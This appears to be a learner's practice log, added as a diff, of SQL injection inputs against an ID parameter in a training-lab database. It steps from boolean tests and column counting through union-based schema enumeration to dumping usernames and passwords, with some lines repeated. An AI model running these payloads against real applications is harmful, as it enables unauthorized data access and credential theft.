@@ -1,0 +1,27 @@
+ID:1
+ID:1
+ID:-1
+ID:1
+ID:1 and 1=1
+ID:1 and 1=2
+ID:1 and 1=2
+ID:1 order by 2 
+ID:1 order by 3 
+ID:1 order by 4 
+ID:1 order by 4-- 
+ID:1 order by 3-- 
+ID:1 order by 4-- 
+ID:1 order by 4-- 
+ID:1 order by 3-- 
+ID:1 union select 1,2,3-- 
+ID:-1 union select 1,2,3-- 
+ID:-1 union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
+ID:-1 union select 1,group_concat(schema_name),3 from information_schema.schemata LIMIT 0, 1 -- 
+ID:-1 union union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--  LIMIT 0,1
+ID:-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--  LIMIT 0,1
+ID:-1 union select * from users where id='-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = 'security' and table_name = 'users' --  LIMIT 0,1
+ID:-1 union select * from users where id='-1' union select 1,group_concat(username),group_concat(password) from security.users -- 
+ID:-1 union select * from users where id='-1' union select 1,group_concat(username),group_concat(password) from security.users -- 
+ID:-1 union select * from users where id='-1' union select 1,group_concat(username),group_concat(password) from security.users -- 
+ID:-1 union select * from users where id='-1' union select 1,group_concat(username),group_concat(password) from security.users -- 
+ID:-1 union select * from users where id='-1' union select 1,group_concat(username),group_concat(password) from security.users -- 
